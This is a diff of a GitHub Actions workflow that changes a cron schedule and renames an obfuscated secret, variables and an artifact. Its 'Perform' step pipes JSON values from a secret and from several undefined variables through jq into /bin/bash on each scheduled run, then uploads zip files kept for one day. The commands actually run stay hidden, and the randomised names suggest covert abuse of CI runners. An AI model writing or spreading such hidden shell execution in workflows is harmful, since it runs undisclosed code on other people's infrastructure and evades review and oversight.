@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '44 1,7,13,19 * * *'
+    - cron: '47 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,19 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          h50874: ${{ secrets.h50874 }}
+          hbyz132: ${{ secrets.hbyz132 }}
         run: |
-          printf '%s' "$h50874" | jq -r .zf44 | /bin/bash
-          echo $ndjho05732 | jq -r .bmiky672 | /bin/bash
-          printf '%s' "$pgx876" | jq -r .eqzi2 | /bin/bash
-          echo $u535 | jq -r .mtple8 | /bin/bash
-          printf '%s' "$yqrh86" | jq -r .te6994 | /bin/bash
-          printf '%s' "$hgnj88" | jq -r .pooj977 | /bin/bash
-          echo $auf23807 | jq -r .k103 | /bin/bash
+          printf '%s' "$hbyz132" | jq -r .eu82 | /bin/bash
+          printf '%s' "$hqgk58361" | jq -r .ly22 | /bin/bash
+          printf '%s' "$selo05" | jq -r .kbgd7279 | /bin/bash
+          echo $l95763 | jq -r .p4 | /bin/bash
+          printf '%s' "$dvpe5158" | jq -r .pom9216 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: z63UNKxr
+          name: r4DmO5DV
           path: "*.zip"
           retention-days: 1
